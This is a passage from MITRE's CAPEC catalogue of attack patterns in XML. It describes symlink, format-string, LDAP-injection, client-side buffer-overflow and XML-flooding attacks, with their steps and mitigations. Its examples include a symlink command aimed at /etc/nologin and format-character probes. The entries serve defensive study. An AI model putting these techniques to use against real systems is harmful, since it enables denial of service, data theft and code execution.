               <html:div style="margin-left:1em;" class="informative">root# vulprog myFile<html:div>
                     <html:i>{...program does some processing...]</html:i>
                  </html:div>
                  <html:br />adversary# ln &#8211;s /etc/nologin myFile<html:div>
                     <html:i>[...program writes to 'myFile', which points to /etc/nologin...]</html:i>
                  </html:div>
               </html:div>
               <html:p>In the above example, the root user ran a program with poorly written file handling routines, providing the filename "myFile" to vulnprog for the relevant data to be written to. However, the adversary happened to be looking over the shoulder of "root" at the time, and created a link from myFile to /etc/nologin. The attack would make no user be able to login.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="59" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1547.009</ns0:Entry_ID>
               <ns0:Entry_Name>Boot or Logon Autostart Execution:Shortcut Modification</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-13" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Extended_Description, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="135" Name="Format String Injection" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137">
               <ns0:Exclude_Related Exclude_ID="403" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey application] The adversary takes an inventory of the entry points of the application.</ns0:Description>
               <ns0:Technique>Spider web sites for all available links</ns0:Technique>
               <ns0:Technique>List parameters, external variables, configuration files variables, etc. that are possibly used by the application.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.</ns0:Description>
               <ns0:Technique>Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.</ns0:Description>
               <ns0:Technique>Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">In order to discover format string vulnerabilities it takes only low skill, however, converting this discovery into a working exploit requires advanced knowledge on the part of the adversary.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Limit the usage of formatting string functions.</ns0:Mitigation>
            <ns0:Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a "../po" directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="134" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="74" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Format string attack</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-14" />
            <ns0:Reference External_Reference_ID="REF-15" Section="WASC-06 - Format String" />
            <ns0:Reference External_Reference_ID="REF-616" Section="Testing for Format String Injection" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Motivation-Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="136" Name="LDAP Injection" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey application] The attacker takes an inventory of the entry points of the application.</ns0:Description>
               <ns0:Technique>Spider web sites for all available links</ns0:Technique>
               <ns0:Technique>Sniff network communications with application using a utility such as WireShark.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax</ns0:Description>
               <ns0:Technique>Use web browser to inject input through text fields or through HTTP GET parameters</ns0:Technique>
               <ns0:Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.</ns0:Technique>
               <ns0:Technique>Use modified client (modified by reverse engineering) to inject input.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.</ns0:Description>
               <ns0:Technique>Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.</ns0:Technique>
               <ns0:Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">The attacker needs to have knowledge of LDAP, especially its query syntax.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Accountability</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Scope>Non-Repudiation</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.</ns0:Mitigation>
            <ns0:Mitigation>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="77" />
            <ns0:Related_Weakness CWE_ID="90" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>29</ns0:Entry_ID>
               <ns0:Entry_Name>LDAP Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>LDAP Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-17" Section="WASC-29 - LDAP Injection" />
            <ns0:Reference External_Reference_ID="REF-608" Section="Testing for LDAP Injection" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="14" Name="Client-side Injection-induced Buffer Overflow" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service. This hostile service is created to deliver the correct content to the client software. For example, if the client-side application is a browser, the service will host a webpage that the browser loads.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target client-side application] The adversary identifies a target client-side application to perform the buffer overflow on. The most common are browsers. If there is a known browser vulnerability an adversary could target that.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.</ns0:Description>
               <ns0:Technique>Many times client side applications will be open source, so an adversary can examine the source code to identify possible injection vectors.</ns0:Technique>
               <ns0:Technique>Examine APIs of the client-side application and look for areas where a buffer overflow might be possible.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Create hostile service] The adversary creates a hostile service that will deliver content to the client-side application. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.</ns0:Description>
               <ns0:Technique>If the client-side application is a browser, the adversary will create a service that delivers a malicious webpage to the browser.</ns0:Technique>
               <ns0:Technique>Create malicious shellcode that will execute when the program execution is returned to it.</ns0:Technique>
               <ns0:Technique>Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the injection vector, the adversary delivers the content to the client-side application using the hostile service and overflows the buffer.</ns0:Description>
               <ns0:Technique>If the adversary is targeting a local client-side application, they just need to use the service themselves.</ns0:Technique>
               <ns0:Technique>If the adversary is attempting to cause an overflow on an external user's client-side application, they must get the user to attach to their service by some other means. This could be getting a user to visit their hostile webpage to target a user's browser.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted client software communicates with an external server.</ns0:Prerequisite>
            <ns0:Prerequisite>The targeted client software has a buffer overflow vulnerability.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To achieve a denial of service, an attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap requires a more in-depth knowledge and higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>An example of indicator is when the client software crashes after executing code downloaded from a hostile server.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>The client software should not install untrusted code from a non-authenticated server.</ns0:Mitigation>
            <ns0:Mitigation>The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers.</ns0:Mitigation>
            <ns0:Mitigation>Perform input validation for length of buffer inputs.</ns0:Mitigation>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Ensure all buffer uses are consistently bounds-checked.</ns0:Mitigation>
            <ns0:Mitigation>Use OS-level preventative functionality. Not a complete solution.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Authors often use &lt;EMBED&gt; tags in HTML documents. For example</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;EMBED TYPE="audio/midi" SRC="/path/file.mid" AUTOSTART="true"&gt;</html:div>
               <html:p>In Internet Explorer 4.0 an adversary attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="353" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="147" Name="XML Ping of the Death" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="528" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs to process XML requests.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.</ns0:Description>
               <ns0:Technique>Send a large number of crafted small XML messages to the target URL.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must receive and process XML transactions.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To send small XML messages</ns0:Skill>
            <ns0:Skill Level="High">To use distributed network to launch the attack</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>DoS: resource consumption (other)</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Provide for network flow control and traffic shaping to control access to the resources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
